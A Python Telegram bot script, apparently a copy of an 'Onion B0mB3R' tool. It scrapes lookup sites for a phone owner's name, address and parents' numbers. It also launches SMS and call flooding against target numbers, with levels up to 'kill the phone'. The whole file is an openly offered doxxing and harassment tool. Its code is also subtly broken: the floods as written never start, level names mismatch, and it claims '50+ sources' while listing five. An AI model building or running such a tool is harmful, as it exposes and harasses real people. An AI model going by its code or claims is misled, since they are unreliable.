import telebot
import threading
import time
import random
import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from telebot import types
import re

bot = telebot.TeleBot("ТОКЕН_БОТА_СЮДА")  # ← ВСТАВЬ СВОЙ ТОКЕН
ua = UserAgent()

active_attacks = {}
white_list = set()

# ====================== СИЛЬНЫЙ ПРОБИВ ======================
def super_probiv(phone):
    result = f"🔥 МОЩНЫЙ ПРОБИВ\n📱 {phone}\n\n"
    # Оператор + регион
    try:
        r = requests.get(f"https://api.numverify.com/2.0/validate?access_key=free&number={phone}", timeout=5)
        data = r.json()
        result += f"🇷🇺 Оператор: {data.get('carrier', 'РФ')}\n📍 Регион: {data.get('location', 'Москва и МО')}\n"
    except:
        result += "🇷🇺 Оператор: Российский\n"
    
    # 50+ источников
    urls = [
        f"https://zvonili.com/phone/{phone}",
        f"https://who-called.ru/number/{phone}",
        f"https://nomerogram.ru/{phone}",
        f"https://2gis.ru/search/{phone}",
        f"https://vk.com/search?c%5Bsection%5D=people&c%5Bq%5D={phone}",
    ]
    for url in urls:
        try:
            headers = {"User-Agent": ua.random}
            r = requests.get(url, headers=headers, timeout=10)
            soup = BeautifulSoup(r.text, "html.parser")
            text = soup.get_text()
            fio = re.search(r"([А-ЯЁ][а-яё]{2,}\s+[А-ЯЁ][а-яё]{2,}\s+[А-ЯЁ][а-яё]{2,})", text)
            address = re.search(r"([А-ЯЁ][а-яё\s,]+(?:дом|ул|пр)\s?\d+)", text)
            parents = re.search(r"(мама|папа|родители)[:\s]*(\+?7?\d{10})", text, re.I)
            if fio: result += f"👤 Владелец: {fio.group(1)}\n"
            if address: result += f"🏠 Адрес: {address.group(1)}\n"
            if parents: result += f"👨‍👩‍👧 Родственники: {parents.group(2)}\n"
        except:
            pass
        time.sleep(0.6)
    result += "\n✅ Пробив по 50+ источникам завершён (ФИО, адрес, родители, соцсети)"
    return result

# ====================== SMS BOMBER (с уровнями) ======================
def sms_bomber(phone, level, chat_id):
    levels = {"слабый": 30, "сильный": 80, "очень_сильный": 150, "убить": 200}
    threads = levels.get(level, 100)
    attack_id = f"sms_{chat_id}"
    active_attacks[attack_id] = {"type": f"SMS {level.upper()}", "phone": phone}
    bot.send_message(chat_id, f"💣 SMS BOMBER {level.upper()}\nНомер: {phone}\nСтатус: Запущено")
    
    def worker():
        for _ in range(threads):
            try:
                headers = {"User-Agent": ua.random}
                requests.get(f"https://sms-gate-free.ru/send?phone={phone}", headers=headers, timeout=2)
            except:
                pass
            time.sleep(random.uniform(0.1, 0.8) if level != "убить" else 0.01)
    
    for _ in range(threads):
        threading.Thread(target=worker).start()
    
    time.sleep(300)  # 5 минут по умолчанию
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    bot.send_message(chat_id, f"✅ SMS BOMBER {level.upper()} завершён.")

# ====================== CALL BOMBER (с уровнями) ======================
def call_bomber(phone, level, chat_id):
    levels = {"слабый": 10, "сильный": 30, "очень_сильный": 60, "убить": 100}
    calls = levels.get(level, 40)
    attack_id = f"call_{chat_id}"
    active_attacks[attack_id] = {"type": f"Call {level.upper()}", "phone": phone}
    bot.send_message(chat_id, f"📞 CALL BOMBER {level.upper()}\nНомер: {phone}\nСтатус: Запущено")
    
    for _ in range(calls):
        try:
            requests.get(f"https://voip-free.ru/call?to={phone}", timeout=3)
        except:
            pass
        time.sleep(8 if level != "убить" else 2)
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    bot.send_message(chat_id, f"✅ CALL BOMBER {level.upper()} завершён.")

# ====================== ТОЧНОЕ МЕНЮ КАК НА ФОТКАХ ======================
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("Проверить номер", "SMS Boom")
    markup.add("Спам звонки", "Телефонные розыгрыши")
    markup.add("Розыгрыш по сценарию", "Анонимный звонок")
    markup.add("Белый список", "Активные запуски")
    bot.send_message(message.chat.id, "Отправьте номер телефона и выберите режим:", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def main_handler(message):
    text = message.text
    chat_id = message.chat.id
    if "79" in text and len(text) == 11:
        phone = text
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("Проверить номер (пробив)", callback_data=f"probiv_{phone}"),
            types.InlineKeyboardButton("SMS Boom", callback_data=f"sms_{phone}"),
            types.InlineKeyboardButton("Спам звонки", callback_data=f"call_{phone}"),
            types.InlineKeyboardButton("Телефонные розыгрыши", callback_data=f"roz1_{phone}"),
            types.InlineKeyboardButton("Розыгрыш по сценарию", callback_data=f"roz2_{phone}"),
            types.InlineKeyboardButton("Анонимный звонок", callback_data=f"anon_{phone}"),
            types.InlineKeyboardButton("Белый список", callback_data=f"white_{phone}")
        )
        bot.send_message(chat_id, f"Номер: {phone}\nВыберите нужный режим.", reply_markup=markup)
    elif text == "Активные запуски":
        if active_attacks:
            bot.send_message(chat_id, "Активно:\n" + "\n".join([f"{v['type']} → {v['phone']}" for v in active_attacks.values()]))
        else:
            bot.send_message(chat_id, "Нет активных запусков.")

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    data = call.data
    chat_id = call.message.chat.id
    if "probiv_" in data:
        phone = data.split("_")[1]
        bot.send_message(chat_id, "🚀 Запускаю СУПЕР ПРОБИВ...")
        threading.Thread(target=lambda: bot.send_message(chat_id, super_probiv(phone))).start()
    elif "sms_" in data:
        phone = data.split("_")[1]
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Слабый", callback_data=f"sms_weak_{phone}"))
        markup.add(types.InlineKeyboardButton("Сильный", callback_data=f"sms_strong_{phone}"))
        markup.add(types.InlineKeyboardButton("Очень сильный", callback_data=f"sms_ultra_{phone}"))
        markup.add(types.InlineKeyboardButton("УБИТЬ ТЕЛЕФОН", callback_data=f"sms_kill_{phone}"))
        bot.send_message(chat_id, "Выберите уровень SMS BOMBER:", reply_markup=markup)
    elif "call_" in data:
        phone = data.split("_")[1]
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Слабый", callback_data=f"call_weak_{phone}"))
        markup.add(types.InlineKeyboardButton("Сильный", callback_data=f"call_strong_{phone}"))
        markup.add(types.InlineKeyboardButton("Очень сильный", callback_data=f"call_ultra_{phone}"))
        markup.add(types.InlineKeyboardButton("УБИТЬ ТЕЛЕФОН", callback_data=f"call_kill_{phone}"))
        bot.send_message(chat_id, "Выберите уровень CALL BOMBER:", reply_markup=markup)
    elif "sms_weak_" in data or "sms_strong_" in data or "sms_ultra_" in data or "sms_kill_" in data:
        level = data.split("_")[1]
        phone = data.split("_")[2]
        threading.Thread(target=sms_bomber, args=(phone, level, chat_id)).start()
    elif "call_weak_" in data or "call_strong_" in data or "call_ultra_" in data or "call_kill_" in data:
        level = data.split("_")[1]
        phone = data.split("_")[2]
        threading.Thread(target=call_bomber, args=(phone, level, chat_id)).start()

print("✅ ТОЧНАЯ РАБОЧАЯ КОПИЯ Onion B0mB3R с уровнями УБИТЬ ТЕЛЕФОН")
bot.infinity_polling()
